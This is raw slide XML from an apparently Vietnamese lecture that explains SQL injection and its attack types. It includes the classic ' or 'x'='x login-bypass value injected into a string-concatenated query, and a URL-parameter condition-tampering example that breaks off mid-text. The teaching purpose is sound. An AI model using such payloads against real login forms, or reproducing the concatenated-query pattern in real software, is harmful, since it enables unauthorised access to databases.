          <p:nvPr>
            <p:ph idx="4294967295"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="88716112"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1431235" y="1972021"/>
          <a:ext cx="8915400" cy="37766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52073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04731" y="403198"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khái niệm</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1404731" y="2963064"/>
            <a:ext cx="9753599" cy="3635867"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL injection có thể cho phép những kẻ tấn công thực hiện các thao tác, delete, insert, update,… trên cơ sở dữ liệu của ứng dụng, thậm chí là server mà ứng dụng đó đang chạy, lỗi này thường xảy ra trên các ứng dụng có dữ liệu được quản lý bằng các hệ quản trị cơ sở dữ liệu như SQL Server, MySQL, Oracle, DB2, Sysbase...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83FE26B5-C848-4825-8D6A-2B4FDFA6CADA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1600200" y="1752600"/>
            <a:ext cx="8915399" cy="889200"/>
            <a:chOff x="0" y="11059"/>
            <a:chExt cx="8915399" cy="889200"/>
          </a:xfrm>
          <a:solidFill>
            <a:schemeClr val="accent6">
              <a:lumMod val="75000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:scene3d>
            <a:camera prst="orthographicFront"/>
            <a:lightRig rig="flat" dir="t"/>
          </a:scene3d>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="Rectangle: Rounded Corners 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{443AC960-4D1D-44AD-B326-41BAED31ECD9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="11059"/>
              <a:ext cx="8915399" cy="889200"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:sp3d prstMaterial="plastic">
              <a:bevelT w="120900" h="88900"/>
              <a:bevelB w="88900" h="31750" prst="angle"/>
            </a:sp3d>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0">
              <a:schemeClr val="lt1">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:schemeClr>
            </a:lnRef>
            <a:fillRef idx="3">
              <a:schemeClr val="accent2">
                <a:shade val="50000"/>
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:schemeClr>
            </a:fillRef>
            <a:effectRef idx="2">
              <a:schemeClr val="accent2">
                <a:shade val="50000"/>
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:schemeClr>
            </a:effectRef>
            <a:fontRef idx="minor">
              <a:schemeClr val="lt1"/>
            </a:fontRef>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Rectangle: Rounded Corners 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A575BEAF-43BA-4288-A258-2FD2B21990D8}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="43407" y="54466"/>
              <a:ext cx="8828585" cy="802386"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:sp3d/>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0">
              <a:scrgbClr r="0" g="0" b="0"/>
            </a:lnRef>
            <a:fillRef idx="0">
              <a:scrgbClr r="0" g="0" b="0"/>
            </a:fillRef>
            <a:effectRef idx="0">
              <a:scrgbClr r="0" g="0" b="0"/>
            </a:effectRef>
            <a:fontRef idx="minor">
              <a:schemeClr val="lt1"/>
            </a:fontRef>
          </p:style>
          <p:txBody>
            <a:bodyPr spcFirstLastPara="0" vert="horz" wrap="square" lIns="144780" tIns="144780" rIns="144780" bIns="144780" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
              <a:noAutofit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1689100" rtl="0">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="35000"/>
                </a:spcAft>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="3800" b="1" kern="1200"/>
                <a:t>SQL INJECTION LÀ GÌ?</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="3800" kern="1200"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34135094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44487" y="389946"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khái niệm</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="4294967295"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3685374104"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="152399" y="2590800"/>
          <a:ext cx="6781801" cy="171091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Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B53BEB1-52CD-4331-854B-6524DC8AB479}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="4294967295"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="1676400"/>
            <a:ext cx="5321300" cy="3995738"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13703548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97496" y="456207"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1683027" y="2289975"/>
            <a:ext cx="8534400" cy="338554"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Tấn công vượt kiểm tra đăng nhập</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Là hình thức cho phép kẻ tấn công đăng nhập vào hệ thống mà không cần có một tài khoản được cấp sẵn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đây là dạng lỗi SQL injection xảy ra khi thiếu đoạn mã kiểm tra dữ liệu đầu vào trong câu truy vấn SQL. Kết quả là người dùng cuối có thể thực hiện một số truy vấn không mong muốn đối với cơ sở dữ liệu của ứng dụng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>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37527047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45465" y="442954"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1539369" y="1676400"/>
            <a:ext cx="9959147" cy="4267200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Tấn công vượt kiểm tra đăng nhập</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ: Phần đăng nhập của một ứng dụng chứa câu lệnh sql sau:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500" i="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>select count(*) from tbUser where UserName=’”+userName+”’ and Password=’”+passWord+””</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2500">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Trong đó 2 biến userName và passWord là đầu vào mà người dùng nhập.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Tuy nhiên, nếu giá trị passWord có giá trị như sau: ' or 'x'='x thì ta sẽ có câu lệnh:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500" i="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>select count(*) from tbUser where UserName=’’ and Password=’ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" b="1" i="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>’or ‘x’=’x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2500" i="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>’;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Câu lệnh này có điều kiện luôn đúng vì ‘x’=’x’ luôn đúng. Vì vậy, chương trình sẽ mặc định hiểu việc đăng nhập thành công vì count(*) &gt; 0.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37149511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Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1545465" y="2133600"/>
            <a:ext cx="9959147" cy="4267200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10776857" y="6474236"/>
            <a:ext cx="640079" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{D57F1E4F-1CFF-5643-939E-217C01CDF565}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>101</a:t>
            </a:fld>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9208" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35288533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10748" y="456206"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295400" y="2001078"/>
            <a:ext cx="10058400" cy="4247322"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công thông qua việc thay đổi điều kiện của câu lệnh select</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công này phức tạp hơn. Để thực hiện được kiểu tấn công này, kẻ tấn công phải có khả năng hiểu và lợi dụng các sơ hở trong các thông báo lỗi từ hệ thống để dò tìm các điểm yếu để tấn công.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Việc thay đổi điều kiện của câu lệnh select sẽ làm thay đổi nội dung hiển thị của trang web hoặc ứng dụng.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27640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37252" y="501649"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</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 y="2438400"/>
            <a:ext cx="11042545" cy="2443163"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7105190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90260" y="442954"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các dạng tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1934818" y="2263472"/>
            <a:ext cx="8534400" cy="338554"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dạng tấn công thông qua việc thay đổi điều kiện của câu lệnh select</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ: Câu lệnh truy vấn để hiển thị nội dung trang web là:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Select * from tbKhachHang where QuyenSuDung=‘User’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Với đường link: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost:6996/KhachHang.aspx?Show=User</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (User là đối số)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Tuy nhiên, thay vì nhập đường link trên, kẻ tấn công sẽ nhập:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost:6996/KhachHang.aspx?Show</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
